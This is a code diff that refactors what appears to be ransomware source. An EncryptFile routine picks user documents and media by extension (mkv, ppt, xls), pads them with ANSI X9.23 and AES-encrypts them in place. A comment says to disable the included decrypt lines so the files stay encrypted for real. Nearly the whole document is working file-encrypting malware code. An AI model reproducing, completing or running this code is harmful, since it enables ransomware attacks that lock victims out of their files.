@@ -21,35 +21,46 @@ bool isValidFile(char* file) {
   !strcmp(ext, "mkv") || !strcmp(ext, "ppt") || !strcmp(ext, "xls")  ;
 }
 
-void EncryptFile(char* fname, const uint8_t* key) {
-  if (!isValidFile(fname)) return;
-  printf("%s\n", fname);
-  cant_files++;
-  FILE* file = fopen(fname, "rb+");
+/*
+  To encrypt files using AES 256, the file size must be a multiple of 16 bytes
+  This function adds 1 to 15 bytes to the file using ANSI X9.23 padding method
+  and returns the new file size
+*/
+uint32_t ANSI_X9_23(FILE* file) {
   fseek(file, 0, SEEK_END);
   uint32_t size = ftell(file);
-
-  // ANSI X9.23 Start
   uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
   uint8_t* pad = new uint8_t[len];
   for (uint8_t i = 0; i < len - 1; i++)
     pad[i] = 0x00;
   pad[len - 1] = len;
   fwrite(pad, sizeof(uint8_t), len, file);
+  rewind(file);
   delete[] pad;
   size += len;
-  // ANSI X9.23 End
+  return size;
+}
 
-  rewind(file);
+// This function does the opposite of the previous one
+void unpad(uint8_t* buffer, uint32_t &size) {
+  size -= buffer[size - 1];
+}
+
+void EncryptFile(char* fname, const uint8_t* key) {
+  if (!isValidFile(fname)) return;
+  printf("%s\n", fname);
+  cant_files++;
+
+  FILE* file = fopen(fname, "rb+");
+  uint32_t size = ANSI_X9_23(file);
   uint8_t* input = new uint8_t[size];
   fread(input, 1, size, file);
 
   AES_encrypt(key, input, size);
 
-/// COMMENT THE NEXT THREE LINES TO ENCRYPT FILES!!!
+/// COMMENT THE NEXT TWO LINES TO ENCRYPT FILES!!!
   AES_decrypt(key, input, size);
-  uint32_t del = input[size - 1];
-  size -= del;
+  unpad(input, size);
 /**/
   fwrite(input, sizeof(uint8_t), size, file);
   delete[] input;
